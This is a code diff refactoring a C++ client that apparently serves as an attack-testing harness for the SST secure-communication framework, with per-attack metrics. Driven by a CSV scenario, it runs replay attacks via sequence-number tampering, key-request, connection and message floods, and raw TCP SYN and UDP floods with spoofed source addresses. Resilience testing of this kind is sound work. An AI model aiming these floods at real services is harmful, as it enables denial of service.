@@ -5,81 +5,362 @@ extern "C" {
 #include <sys/socket.h>
 #include <unistd.h>
 
+#include <array>
 #include <cerrno>
 #include <chrono>
 #include <cstring>
+#include <format>
 #include <fstream>
+#include <memory>
+#include <optional>
+#include <string_view>
 #include <thread>
+#include <vector>
 
 #include "lib/metrics.hpp"
 #include "lib/send_syn.hpp"
 
-enum AttackType { NONE, REPLAY, DOSK, DOSC, DOSM, DOSS, DOSU };
-enum AttackTarget { TARGET_NONE, TARGET_AUTH, TARGET_SERVER };
+enum class AttackType { NONE, REPLAY, DOSK, DOSC, DOSM, DOSS, DOSU };
+enum class AttackTarget { TARGET_NONE, TARGET_AUTH, TARGET_SERVER };
 
-static AttackType parseAttackType(const std::string& s) {
-    if (s == "REPLAY" || s == "Replay" || s == "replay") return REPLAY;
+static AttackType parseAttackType(std::string_view s) {
+    if (s == "REPLAY" || s == "Replay" || s == "replay")
+        return AttackType::REPLAY;
     if (s == "DOSK" || s == "DoSK" || s == "DosK" || s == "Dosk" ||
         s == "dosK" || s == "dosk")
-        return DOSK;
+        return AttackType::DOSK;
     if (s == "DOSC" || s == "DoSC" || s == "DosC" || s == "Dosc" ||
         s == "dosC" || s == "dosc")
-        return DOSC;
+        return AttackType::DOSC;
     if (s == "DOSM" || s == "DoSM" || s == "DosM" || s == "Dosm" ||
         s == "dosM" || s == "dosm")
-        return DOSM;
+        return AttackType::DOSM;
     if (s == "DOSS" || s == "DoSS" || s == "DosS" || s == "Doss" || s == "doss")
-        return DOSS;
+        return AttackType::DOSS;
     if (s == "DOSU" || s == "DoSU" || s == "DosU" || s == "Dosu" ||
         s == "dosU" || s == "dosu")
-        return DOSU;
-    return NONE;
+        return AttackType::DOSU;
+    return AttackType::NONE;
 }
 
-static AttackTarget parseAttackTarget(const std::string& s) {
-    if (s == "auth" || s == "Auth" || s == "a" || s == "A") return TARGET_AUTH;
+static AttackTarget parseAttackTarget(std::string_view s) {
+    if (s == "auth" || s == "Auth" || s == "a" || s == "A")
+        return AttackTarget::TARGET_AUTH;
     if (s == "server" || s == "Server" || s == "s" || s == "S")
-        return TARGET_SERVER;
-    return TARGET_NONE;
+        return AttackTarget::TARGET_SERVER;
+    return AttackTarget::TARGET_NONE;
+}
+
+struct SessionCloser {
+    void operator()(SST_session_ctx_t* session) const {
+        if (session == nullptr) return;
+        close(session->sock);
+        free_session_ctx(session);
+    }
+};
+using SessionPtr = std::unique_ptr<SST_session_ctx_t, SessionCloser>;
+
+static void run_replay(const std::string& attack_param,
+                       SST_session_ctx_t* session_ctx) {
+    // Replay Attack
+    SST_print_log("Performing Replay Attack with parameter: %s\n",
+                  attack_param.c_str());
+    if (attack_param == "seq--") {
+        session_ctx->sent_seq_num--;
+    } else if (attack_param == "seq++") {
+        session_ctx->sent_seq_num++;
+    } else if (attack_param.rfind("seq=", 0) == 0) {
+        // parse “seq=#”
+        int v = std::stoi(attack_param.substr(4));
+        session_ctx->sent_seq_num = v;
+    }
+}
+
+static void run_dosk(const std::string& attack_param, bool metrics,
+                     SST_ctx_t* ctx) {
+    // Quantity of get_session_key requests is the fourth column in
+    // the CSV
+    int repeat = std::stoi(attack_param);
+    std::string exp_id = std::format("DOSK:repeat={}", repeat);
+
+    // from metrics.hpp
+    // If the user used the -metrics flag, set up metrics logging
+    MetricsRow row;
+    if (metrics) {
+        metrics_open_new_file();
+        metrics_write_header_if_empty();
+        row = metrics_begin_row(exp_id);
+    }
+
+    // DOS Attack on get_session_key
+    for (int i = 0; i < repeat; ++i) {
+        SST_print_log("Getting session key: %d of %d\n", i + 1, repeat);
+
+        // Track how long it takes to get the session key
+        auto t0 = std::chrono::steady_clock::now();
+        auto requested_keys =
+            std::unique_ptr<session_key_list_t,
+                            decltype(&free_session_key_list_t)>(
+                get_session_key(ctx, nullptr), free_session_key_list_t);
+        auto t1 = std::chrono::steady_clock::now();
+
+        long dur_us =
+            std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
+                .count();
+
+        if (metrics) {
+            metrics_add_sample(row, dur_us, requested_keys != nullptr);
+        }
+
+        if (requested_keys == nullptr) {
+            SST_print_error(
+                "Client failed to get session key in DOS "
+                "Key attack.");
+            break;
+        }
+    }
+
+    if (metrics) {
+        metrics_end_row_and_write(row);
+    }
+}
+
+static void run_dosc(const std::string& attack_param, bool metrics,
+                     SST_ctx_t* ctx, std::vector<SessionPtr>& sessions) {
+    // Quantity of secure_connect_to_server requests is the fourth
+    // column in the CSV
+    int repeat = std::stoi(attack_param);
+    std::string exp_id = std::format("DOSC:repeat={}", repeat);
+
+    MetricsRow row;
+    if (metrics) {
+        metrics_open_new_file();
+        metrics_write_header_if_empty();
+        row = metrics_begin_row(exp_id);
+    }
+
+    // DOS Attack on secure_connect_to_server
+    int i = 0;
+    while (i < repeat) {
+        auto requested_keys =
+            std::unique_ptr<session_key_list_t,
+                            decltype(&free_session_key_list_t)>(
+                get_session_key(ctx, nullptr), free_session_key_list_t);
+        if (requested_keys == nullptr) {
+            SST_print_error(
+                "Client failed to get session key in DOS "
+                "Connect attack.");
+            continue;
+        }
+        SST_print_log("Connecting to server: %d of %d\n", i + 1, repeat);
+
+        // Track how long it takes to connect
+        auto t0 = std::chrono::steady_clock::now();
+        SessionPtr connection(
+            secure_connect_to_server(&requested_keys->s_key[0], ctx));
+        ++i;
+        auto t1 = std::chrono::steady_clock::now();
+
+        long long dur_us =
+            std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
+                .count();
+
+        if (metrics) {
+            metrics_add_sample(row, dur_us, connection != nullptr);
+        }
+
+        if (connection == nullptr) {
+            SST_print_error(
+                "Client failed to connect to server in DOS "
+                "Connect attack.");
+            continue;
+        }
+        sessions.push_back(std::move(connection));
+    }
+
+    if (metrics) {
+        metrics_end_row_and_write(row);
+    }
+}
+
+static void run_dosm(const std::string& attack_param, bool metrics,
+                     std::string message, SST_session_ctx_t* session_ctx) {
+    // Quantity of send_secure_message requests is the fourth column
+    // in the CSV
+    int repeat = std::stoi(attack_param);
+    std::string exp_id = std::format("DOSM:repeat={}", repeat);
+
+    MetricsRow row;
+    if (metrics) {
+        metrics_open_new_file();
+        metrics_write_header_if_empty();
+        row = metrics_begin_row(exp_id);
+    }
+
+    // DOS Attack on send_secure_message
+    std::array<unsigned char, MAX_SECURE_COMM_MSG_LENGTH> received_buf{};
+    for (int i = 0; i < repeat; ++i) {
+        SST_print_log("Sending message: %s (%d of %d)\n", message.c_str(),
+                      i + 1, repeat);
+
+        // Track how long it takes to send the message and get a
+        // response
+        auto t0 = std::chrono::steady_clock::now();
+
+        int msg =
+            send_secure_message(message.data(), message.length(), session_ctx);
+        if (msg < 0) {
+            SST_print_error_exit("Failed send_secure_message().");
+        }
+
+        if (metrics) {
+            if (int ret = read_secure_message(received_buf.data(), session_ctx);
+                ret < 0) {
+                SST_print_error("Failed to read secure message.");
+                continue;
+            } else if (ret == 0) {
+                SST_print_error("Connection closed");
+                continue;
+            }
+
+            auto t1 = std::chrono::steady_clock::now();
+
+            long dur_us =
+                std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
+                    .count();
+            metrics_add_sample(row, dur_us, msg >= 0);
+        }
+    }
+
+    if (metrics) {
+        metrics_end_row_and_write(row);
+    }
+}
+
+struct PacketTarget {
+    const char* ip;
+    unsigned short port;
+};
+
+static std::optional<PacketTarget> packet_target(const SST_ctx_t* ctx,
+                                                 std::string_view target) {
+    switch (parseAttackTarget(target)) {
+        case AttackTarget::TARGET_AUTH:
+            return PacketTarget{
+                ctx->config.auth_ip_addr,
+                static_cast<unsigned short>(ctx->config.auth_port_num)};
+        case AttackTarget::TARGET_SERVER:
+            return PacketTarget{ctx->config.entity_server_ip_addr,
+                                static_cast<unsigned short>(
+                                    ctx->config.entity_server_port_num)};
+        default:
+            return std::nullopt;
+    }
+}
+
+static void run_raw_packets(const std::string& attack_param,
+                            const std::string& attack_target, bool metrics,
+                            const char* src_ip, const SST_ctx_t* ctx,
+                            bool use_tcp) {
+    const char* label = use_tcp ? "DOSS" : "DOSU";
+    if ((std::strcmp(ctx->config.network_protocol, "TCP") == 0) != use_tcp) {
+        errno = 0;
+        SST_print_error("%s denied: set the network protocol to %s.", label,
+                        use_tcp ? "TCP" : "UDP");
+        return;
+    }
+    if (attack_target.empty()) {
+        errno = 0;
+        SST_print_error("%s requires a 5th CSV column target.", label);
+        return;
+    }
+    auto target = packet_target(ctx, attack_target);
+    if (!target) {
+        errno = 0;
+        SST_print_error("Invalid %s target '%s'.", label,
+                        attack_target.c_str());
+        return;
+    }
+    std::array<char, INET_ADDRSTRLEN> default_src_ip{};
+    const char* source = nullptr;
+    if (!resolve_src_ip_or_default(src_ip, target->ip, target->port,
+                                   default_src_ip.data(), default_src_ip.size(),
+                                   &source))
+        return;
+    int repeat = std::stoi(attack_param);
+    MetricsRow row;
+    if (metrics) {
+        metrics_open_new_file();
+        metrics_write_header_if_empty();
+        row = metrics_begin_row(std::format("{}:target={}:repeat={}", label,
+                                            attack_target, repeat));
+    }
+    auto send_packets =
+        use_tcp ? send_raw_syn_packets_measured : send_raw_udp_packets_measured;
+    send_packets(source, target->ip, target->port, repeat,
+                 metrics ? &row : nullptr);
+    if (metrics) metrics_end_row_and_write(row);
+}
+
+struct ClientOptions {
+    bool metrics = false;
+    const char* src_ip = nullptr;
+};
+
+static bool parse_options(int argc, char* argv[], ClientOptions& options) {
+    if (argc < 3 || argc > 5) return false;
+    if (argc == 3) return true;
+    if (std::strcmp(argv[3], "-metrics") != 0) {
+        if (argc == 5) return false;
+        options.src_ip = argv[3];
+        return true;
+    }
+    options.metrics = true;
+    if (argc == 5) {
+        if (std::strcmp(argv[4], "-metrics") == 0) return false;
+        options.src_ip = argv[4];
+    }
+    return true;
+}
+
+struct ScenarioStep {
+    int sleep_ms;
+    std::string message;
+    AttackType type;
+    std::string parameter;
+    std::string target;
+};
+
+static ScenarioStep parse_step(const std::string& line) {
+    // The optional fifth field consumes the rest of the line, as before.
+    std::array<std::string, 5> fields;
+    size_t start = 0;
+    for (size_t field = 0; field < fields.size() - 1; ++field) {
+        size_t comma = line.find(',', start);
+        fields[field] =
+            line.substr(start, comma == std::string::npos ? std::string::npos
+                                                          : comma - start);
+        if (comma == std::string::npos) {
+            start = line.size();
+            break;
+        }
+        start = comma + 1;
+    }
+    fields.back() = line.substr(start);
+    return {std::stoi(fields[0]), fields[1], parseAttackType(fields[2]),
+            fields[3], fields[4]};
 }
 
 int main(int argc, char* argv[]) {
-    // allow: ./client <config_path> <csv_file_path> [-metrics] [src_ip]
-    if (argc < 3 || argc > 5) {
+    ClientOptions options;
+    if (!parse_options(argc, argv, options)) {
         SST_print_error(
             "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
             argv[0]);
         return EXIT_FAILURE;
     }
-
-    bool metrics = false;
-    const char* src_ip = NULL;
-
-    if (argc == 4) {
-        if (std::strcmp(argv[3], "-metrics") == 0) {
-            metrics = true;
-        } else {
-            src_ip = argv[3];
-        }
-    } else if (argc == 5) {
-        if (std::strcmp(argv[3], "-metrics") != 0) {
-            SST_print_error(
-                "Invalid arguments. With 5 args, argv[3] must be -metrics.");
-            SST_print_error(
-                "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
-                argv[0]);
-            return EXIT_FAILURE;
-        }
-        metrics = true;
-        src_ip = argv[4];
-        if (std::strcmp(src_ip, "-metrics") == 0) {
-            SST_print_error("src_ip cannot be -metrics.");
-            SST_print_error(
-                "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
-                argv[0]);
-            return EXIT_FAILURE;
-        }
-    }
+    bool metrics = options.metrics;
+    const char* src_ip = options.src_ip;
 
     if (metrics) {
         SST_print_log("Metrics logging enabled.\n");
@@ -91,17 +372,19 @@ int main(int argc, char* argv[]) {
     // Standard SST initialization
     char* config_path = argv[1];
     SST_ctx_t* ctx = init_SST(config_path);
+    if (ctx == nullptr) return EXIT_FAILURE;
 
-    session_key_list_t* s_key_list = get_session_key(ctx, NULL);
-    if (s_key_list == NULL) {
+    session_key_list_t* s_key_list = get_session_key(ctx, nullptr);
+    if (s_key_list == nullptr) {
         SST_print_error("Client failed to get session key.");
-        exit(1);
+        free_SST_ctx_t(ctx);
+        return EXIT_FAILURE;
     }
 
     // SST Connect to server
     SST_session_ctx_t* session_ctx =
         secure_connect_to_server(&s_key_list->s_key[0], ctx);
-    if (session_ctx == NULL) {
+    if (session_ctx == nullptr) {
         SST_print_error(
             "Client failed to establish secure session with server.");
         free_session_key_list_t(s_key_list);
@@ -109,392 +392,56 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
+    std::vector<SessionPtr> attack_sessions;
+
     // Read CSV file
     std::string my_file_path = argv[2];
     std::ifstream file(my_file_path);
     std::string line;
 
     while (std::getline(file, line)) {
-        // CSV:
-        // - basic message: sleep_ms,message
-        // - most attacks:  sleep_ms,message,attack_type,attack_param
-        // - DOSS/DOSU:     sleep_ms,message,doss|dosu,repeat,target
-        size_t comma1 = line.find(',');
-        size_t comma2 = line.find(',', comma1 + 1);
-        size_t comma3 = line.find(',', comma2 + 1);
-        size_t comma4 = (comma3 != std::string::npos)
-                            ? line.find(',', comma3 + 1)
-                            : std::string::npos;
-
-        // Sleep for the specified time
-        std::string sleep_time_str = line.substr(0, comma1);
-        int sleep_time = std::stoi(sleep_time_str);
-        std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
-
-        // Send message to server
-        std::string message = line.substr(comma1 + 1, comma2 - comma1 - 1);
+        auto step = parse_step(line);
+        std::this_thread::sleep_for(std::chrono::milliseconds(step.sleep_ms));
+        auto& message = step.message;
+        const auto& attack_param = step.parameter;
+        const auto& attack_target = step.target;
         SST_print_log("Sending message: %s\n", message.c_str());
-
-        int msg = send_secure_message(const_cast<char*>(message.c_str()),
-                                      message.length(), session_ctx);
-        if (msg < 0) {
+        if (send_secure_message(message.data(), message.size(), session_ctx) <
+            0)
             SST_print_error_exit("Failed send_secure_message().");
-        }
-
-        std::string attack_type_str;
-
-        if (comma2 != std::string::npos) {
-            std::size_t start = comma2 + 1;
-
-            if (comma3 == std::string::npos) {
-                // No 3rd comma: go to the end of the line
-                attack_type_str = line.substr(start);
-            } else {
-                // 3rd comma: grab text between 2nd and 3rd comma
-                std::size_t len = comma3 - start;
-                attack_type_str = line.substr(start, len);
-            }
-        } else {
-            // No 2nd comma: use empty string
-            attack_type_str = "";
-        }
-
-        AttackType attack_type = parseAttackType(attack_type_str);
-
-        // 4th CSV column is attack_param
-        // 5th CSV column is attack_target if DOSS or DOSU.
-        std::string attack_param;
-        std::string attack_target;
-        if (comma3 != std::string::npos) {
-            if (comma4 == std::string::npos) {
-                attack_param = line.substr(comma3 + 1);
-            } else {
-                attack_param = line.substr(comma3 + 1, comma4 - comma3 - 1);
-                attack_target = line.substr(comma4 + 1);
-            }
-        }
 
         if (metrics) {
             sleep(10);
         }
 
-        switch (attack_type) {
-            case REPLAY: {
-                // Replay Attack
-                SST_print_log("Performing Replay Attack with parameter: %s\n",
-                              attack_param.c_str());
-                if (attack_param == "seq--") {
-                    session_ctx->sent_seq_num--;
-                } else if (attack_param == "seq++") {
-                    session_ctx->sent_seq_num++;
-                } else if (attack_param.rfind("seq=", 0) == 0) {
-                    // parse “seq=#”
-                    int v = std::stoi(attack_param.substr(4));
-                    session_ctx->sent_seq_num = v;
-                }
-            } break;
+        switch (step.type) {
+            case AttackType::REPLAY:
+                run_replay(attack_param, session_ctx);
+                break;
 
-            case DOSK: {
-                // Quantity of get_session_key requests is the fourth column in
-                // the CSV
-                int repeat = std::stoi(attack_param);
-                std::string exp_id = "DOSK:repeat=" + std::to_string(repeat);
+            case AttackType::DOSK:
+                run_dosk(attack_param, metrics, ctx);
+                break;
 
-                // from metrics.hpp
-                // If the user used the -metrics flag, set up metrics logging
-                MetricsRow row;
-                if (metrics) {
-                    metrics_open_new_file();
-                    metrics_write_header_if_empty();
-                    row = metrics_begin_row(exp_id);
-                }
+            case AttackType::DOSC:
+                run_dosc(attack_param, metrics, ctx, attack_sessions);
+                break;
 
-                // DOS Attack on get_session_key
-                for (int i = 0; i < repeat; ++i) {
-                    SST_print_log("Getting session key: %d of %d\n", i + 1,
-                                  repeat);
+            case AttackType::DOSM:
+                run_dosm(attack_param, metrics, message, session_ctx);
+                break;
 
-                    // Track how long it takes to get the session key
-                    auto t0 = std::chrono::steady_clock::now();
-                    session_key_list_t* s_key_list = get_session_key(ctx, NULL);
-                    auto t1 = std::chrono::steady_clock::now();
+            case AttackType::DOSS:
+                run_raw_packets(attack_param, attack_target, metrics, src_ip,
+                                ctx, true);
+                break;
 
-                    long dur_us =
-                        std::chrono::duration_cast<std::chrono::microseconds>(
-                            t1 - t0)
-                            .count();
+            case AttackType::DOSU:
+                run_raw_packets(attack_param, attack_target, metrics, src_ip,
+                                ctx, false);
+                break;
 
-                    if (metrics) {
-                        metrics_add_sample(row, dur_us, s_key_list != NULL);
-                    }
-
-                    if (s_key_list == NULL) {
-                        SST_print_error(
-                            "Client failed to get session key in DOS "
-                            "Key attack.");
-                        break;
-                    }
-                }
-
-                if (metrics) {
-                    metrics_end_row_and_write(row);
-                }
-
-            } break;
-
-            case DOSC: {
-                // Quantity of secure_connect_to_server requests is the fourth
-                // column in the CSV
-                int repeat = std::stoi(attack_param);
-                std::string exp_id = "DOSC:repeat=" + std::to_string(repeat);
-                SST_session_ctx_t* session_ctx[repeat];
-
-                MetricsRow row;
-                if (metrics) {
-                    metrics_open_new_file();
-                    metrics_write_header_if_empty();
-                    row = metrics_begin_row(exp_id);
-                }
-
-                // DOS Attack on secure_connect_to_server
-                for (int i = 0; i < repeat; ++i) {
-                    s_key_list = get_session_key(ctx, NULL);
-                    if (s_key_list == NULL) {
-                        SST_print_error(
-                            "Client failed to get session key in DOS "
-                            "Connect attack.");
-                        i--;
-                        continue;
-                    }
-                    SST_print_log("Connecting to server: %d of %d\n", i + 1,
-                                  repeat);
-
-                    // Track how long it takes to connect
-                    auto t0 = std::chrono::steady_clock::now();
-                    session_ctx[i] =
-                        secure_connect_to_server(&s_key_list->s_key[0], ctx);
-                    auto t1 = std::chrono::steady_clock::now();
-
-                    long long dur_us =
-                        std::chrono::duration_cast<std::chrono::microseconds>(
-                            t1 - t0)
-                            .count();
-
-                    if (metrics) {
-                        metrics_add_sample(row, dur_us, session_ctx[i] != NULL);
-                    }
-
-                    if (session_ctx[i] == NULL) {
-                        SST_print_error(
-                            "Client failed to connect to server in DOS "
-                            "Connect attack.");
-                        continue;
-                    }
-                }
-
-                if (metrics) {
-                    metrics_end_row_and_write(row);
-                }
-
-            } break;
-
-            case DOSM: {
-                // Quantity of send_secure_message requests is the fourth column
-                // in the CSV
-                int repeat = std::stoi(attack_param);
-                std::string exp_id = "DOSM:repeat=" + std::to_string(repeat);
-
-                MetricsRow row;
-                if (metrics) {
-                    metrics_open_new_file();
-                    metrics_write_header_if_empty();
-                    row = metrics_begin_row(exp_id);
-                }
-
-                // DOS Attack on send_secure_message
-                unsigned char received_buf[MAX_SECURE_COMM_MSG_LENGTH];
-                for (int i = 0; i < repeat; ++i) {
-                    SST_print_log("Sending message: %s (%d of %d)\n",
-                                  message.c_str(), i + 1, repeat);
-
-                    // Track how long it takes to send the message and get a
-                    // response
-                    auto t0 = std::chrono::steady_clock::now();
-
-                    int msg =
-                        send_secure_message(const_cast<char*>(message.c_str()),
-                                            message.length(), session_ctx);
-                    if (msg < 0) {
-                        SST_print_error_exit("Failed send_secure_message().");
-                    }
-
-                    if (metrics) {
-                        int ret =
-                            read_secure_message(received_buf, session_ctx);
-
-                        if (ret < 0) {
-                            SST_print_error("Failed to read secure message.");
-                            continue;
-                        } else if (ret == 0) {
-                            SST_print_error("Connection closed");
-                            continue;
-                        }
-
-                        auto t1 = std::chrono::steady_clock::now();
-
-                        long dur_us = std::chrono::duration_cast<
-                                          std::chrono::microseconds>(t1 - t0)
-                                          .count();
-                        metrics_add_sample(row, dur_us, msg >= 0);
-                    }
-                }
-
-                if (metrics) {
-                    metrics_end_row_and_write(row);
-                }
-
-            } break;
-
-            case DOSS: {
-                // DOSS requires TCP config.
-                bool use_tcp =
-                    std::strcmp((const char*)ctx->config.network_protocol,
-                                "TCP") == 0;
-                if (!use_tcp) {
-                    errno = 0;
-                    SST_print_error(
-                        "DOSS denied: the network protocol is UDP. "
-                        "Set the network protocol to TCP to run DOSS.");
-                    break;
-                }
-
-                if (attack_target.empty()) {
-                    errno = 0;
-                    SST_print_error("DOSS requires a 5th CSV column target.");
-                    break;
-                }
-
-                // Target from CSV file
-                // Either Auth or Server
-                AttackTarget target = parseAttackTarget(attack_target);
-                const char* dst_ip_str = NULL;
-                unsigned short dst_port = 0;
-
-                if (target == TARGET_AUTH) {
-                    dst_ip_str = ctx->config.auth_ip_addr;
-                    dst_port =
-                        static_cast<unsigned short>(ctx->config.auth_port_num);
-                } else if (target == TARGET_SERVER) {
-                    dst_ip_str = ctx->config.entity_server_ip_addr;
-                    dst_port = static_cast<unsigned short>(
-                        ctx->config.entity_server_port_num);
-                } else {
-                    errno = 0;
-                    SST_print_error("Invalid DOSS target '%s'.",
-                                    attack_target.c_str());
-                    break;
-                }
-
-                char default_src_ip[INET_ADDRSTRLEN];
-                const char* src_ip_to_use = NULL;
-                if (!resolve_src_ip_or_default(
-                        src_ip, dst_ip_str, dst_port, default_src_ip,
-                        sizeof(default_src_ip), &src_ip_to_use)) {
-                    break;
-                }
-
-                int repeat = std::stoi(attack_param);
-                if (metrics) {
-                    std::string exp_id = "DOSS:target=" + attack_target +
-                                         ":repeat=" + std::to_string(repeat);
-                    metrics_open_new_file();
-                    metrics_write_header_if_empty();
-                    MetricsRow row = metrics_begin_row(exp_id);
-                    send_raw_syn_packets_measured(
-                        src_ip_to_use,  // spoofed source IP
-                        dst_ip_str,     // destination IP
-                        dst_port,       // destination port
-                        repeat,         // number of packets
-                        &row);
-                    metrics_end_row_and_write(row);
-                } else {
-                    send_raw_syn_packets(src_ip_to_use,  // spoofed source IP
-                                         dst_ip_str,     // destination IP
-                                         dst_port,       // destination port
-                                         repeat          // number of packets
-                    );
-                }
-            } break;
-
-            case DOSU: {
-                // DOSU requires UDP config.
-                bool use_tcp =
-                    std::strcmp((const char*)ctx->config.network_protocol,
-                                "TCP") == 0;
-                if (use_tcp) {
-                    errno = 0;
-                    SST_print_error(
-                        "DOSU denied: the network protocol is TCP. "
-                        "Set the network protocol to UDP to run DOSU.");
-                    break;
-                }
-
-                if (attack_target.empty()) {
-                    errno = 0;
-                    SST_print_error("DOSU requires a 5th CSV column target.");
-                    break;
-                }
-
-                AttackTarget target = parseAttackTarget(attack_target);
-                const char* dst_ip_str = NULL;
-                uint16_t dst_port = 0;
-                if (target == TARGET_AUTH) {
-                    dst_ip_str = ctx->config.auth_ip_addr;
-                    dst_port = static_cast<uint16_t>(ctx->config.auth_port_num);
-                } else if (target == TARGET_SERVER) {
-                    dst_ip_str = ctx->config.entity_server_ip_addr;
-                    dst_port = static_cast<uint16_t>(
-                        ctx->config.entity_server_port_num);
-                } else {
-                    errno = 0;
-                    SST_print_error("Invalid DOSU target '%s'.",
-                                    attack_target.c_str());
-                    break;
-                }
-
-                int repeat = std::stoi(attack_param);
-
-                char default_src_ip[INET_ADDRSTRLEN];
-                const char* src_ip_to_use = NULL;
-                if (!resolve_src_ip_or_default(
-                        src_ip, dst_ip_str, dst_port, default_src_ip,
-                        sizeof(default_src_ip), &src_ip_to_use)) {
-                    break;
-                }
-
-                if (metrics) {
-                    std::string exp_id = "DOSU:target=" + attack_target +
-                                         ":repeat=" + std::to_string(repeat);
-                    metrics_open_new_file();
-                    metrics_write_header_if_empty();
-                    MetricsRow row = metrics_begin_row(exp_id);
-                    send_raw_udp_packets_measured(
-                        src_ip_to_use,  // spoofed source IP
-                        dst_ip_str,     // destination IP
-                        dst_port,       // destination port
-                        repeat,         // number of packets
-                        &row);
-                    metrics_end_row_and_write(row);
-                } else {
-                    send_raw_udp_packets(src_ip_to_use,  // spoofed source IP
-                                         dst_ip_str,     // destination IP
-                                         dst_port,       // destination port
-                                         repeat          // number of packets
-                    );
-                }
-            } break;
-
-            case NONE:
+            case AttackType::NONE:
             default:
                 break;
         }
@@ -502,7 +449,8 @@ int main(int argc, char* argv[]) {
 
     SST_print_log("Successfully finished communication.\n");
 
-    free(session_ctx);
+    close(session_ctx->sock);
+    free_session_ctx(session_ctx);
     free_session_key_list_t(s_key_list);
     free_SST_ctx_t(ctx);
 
